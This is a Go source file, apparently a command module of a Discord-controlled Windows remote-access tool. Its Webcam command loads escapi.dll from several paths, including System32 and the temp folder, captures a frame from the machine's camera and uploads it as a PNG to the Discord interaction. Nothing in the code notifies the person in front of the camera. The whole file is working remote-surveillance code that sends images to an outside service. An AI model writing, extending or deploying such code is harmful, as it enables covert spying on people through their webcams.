//go:build windows

package commands

import (
	"bytes"
	"errors"
	"fmt"
	"image"
	"image/png"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/sys/windows"
)

const (
	camWidth  = 640
	camHeight = 480
)

// simpleCapParams replica struct SimpleCapParams de escapi.h.
type simpleCapParams struct {
	TargetBuf *int32
	Width     int32
	Height    int32
}

// Webcam captura un frame con escapi.dll y lo sube como PNG. Si la DLL o la
// cámara no están disponibles, responde con un embed de fallback.
func Webcam(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	data, err := captureWebcam()
	if err != nil {
		embed := &discordgo.MessageEmbed{
			Title:       "📷 Webcam no disponible",
			Description: err.Error(),
			Color:       15158332,
			Timestamp:   nowTimestamp(),
		}
		FinishEmbed(s, i, embed)
		return
	}

	content := fmt.Sprintf("📷 Webcam — %s", time.Now().Format("2006-01-02 15:04:05"))
	file := &discordgo.File{
		Name:        fmt.Sprintf("webcam_%d.png", time.Now().Unix()),
		ContentType: "image/png",
		Reader:      bytes.NewReader(data),
	}
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Files:   []*discordgo.File{file},
	}); err != nil {
		Finish(s, i, "❌ No se pudo subir la captura: "+err.Error())
	}
}

func loadEscapi() (*windows.DLL, error) {
	candidates := make([]string, 0, 4)
	if exe, err := os.Executable(); err == nil {
		candidates = append(candidates, filepath.Join(filepath.Dir(exe), "escapi.dll"))
	}
	candidates = append(candidates,
		filepath.Join(systemRoot(), "System32", "escapi.dll"),
		"escapi.dll",
		filepath.Join(os.TempDir(), "escapi.dll"),
	)

	var lastErr error
	for _, candidate := range candidates {
		dll, err := windows.LoadDLL(candidate)
		if err == nil {
			return dll, nil
		}
		lastErr = err
	}
	return nil, fmt.Errorf("escapi.dll no encontrada: %v", lastErr)
}

func captureWebcam() ([]byte, error) {
	dll, err := loadEscapi()
	if err != nil {
		return nil, err
	}
	defer func() {
		if cerr := dll.Release(); cerr != nil {
			_ = cerr
		}
	}()

	initCOM, err := dll.FindProc("escapiInitCOM")
	if err != nil {
		return nil, fmt.Errorf("escapi: InitCOM no exportada: %w", err)
	}
	countDevices, err := dll.FindProc("escapiCountCaptureDevices")
	if err != nil {
		return nil, fmt.Errorf("escapi: CountCaptureDevices no exportada: %w", err)
	}
	initCapture, err := dll.FindProc("escapiInitCapture")
	if err != nil {
		return nil, fmt.Errorf("escapi: InitCapture no exportada: %w", err)
	}
	deinitCapture, err := dll.FindProc("escapiDeinitCapture")
	if err != nil {
		return nil, fmt.Errorf("escapi: DeinitCapture no exportada: %w", err)
	}
	doCapture, err := dll.FindProc("escapiDoCapture")
	if err != nil {
		return nil, fmt.Errorf("escapi: DoCapture no exportada: %w", err)
	}
	isDone, err := dll.FindProc("escapiIsCaptureDone")
	if err != nil {
		return nil, fmt.Errorf("escapi: IsCaptureDone no exportada: %w", err)
	}

	if res, _, _ := initCOM.Call(); res == 0 {
		return nil, errors.New("escapi: InitCOM falló")
	}
	if deinitCOM, findErr := dll.FindProc("escapiDeinitCOM"); findErr == nil {
		defer deinitCOM.Call()
	}

	count, _, _ := countDevices.Call()
	if count == 0 {
		return nil, errors.New("escapi: no hay cámaras disponibles")
	}

	buf := make([]byte, camWidth*camHeight*4)
	params := simpleCapParams{
		TargetBuf: (*int32)(unsafe.Pointer(&buf[0])),
		Width:     camWidth,
		Height:    camHeight,
	}

	res, _, _ := initCapture.Call(0, uintptr(unsafe.Pointer(&params)))
	if res == 0 {
		return nil, errors.New("escapi: InitCapture falló")
	}
	defer deinitCapture.Call(0)

	doCapture.Call(0)
	deadline := time.Now().Add(3 * time.Second)
	for {
		done, _, _ := isDone.Call(0)
		if done != 0 {
			break
		}
		if time.Now().After(deadline) {
			return nil, errors.New("escapi: timeout esperando el frame")
		}
		time.Sleep(50 * time.Millisecond)
	}

	// ESCAPI entrega 32 bits por píxel en orden BGRA.
	img := image.NewRGBA(image.Rect(0, 0, camWidth, camHeight))
	for index := 0; index+3 < len(buf); index += 4 {
		img.Pix[index] = buf[index+2]
		img.Pix[index+1] = buf[index+1]
		img.Pix[index+2] = buf[index]
		img.Pix[index+3] = 0xFF
	}

	var out bytes.Buffer
	if err := png.Encode(&out, img); err != nil {
		return nil, fmt.Errorf("webcam: png: %w", err)
	}
	return out.Bytes(), nil
}
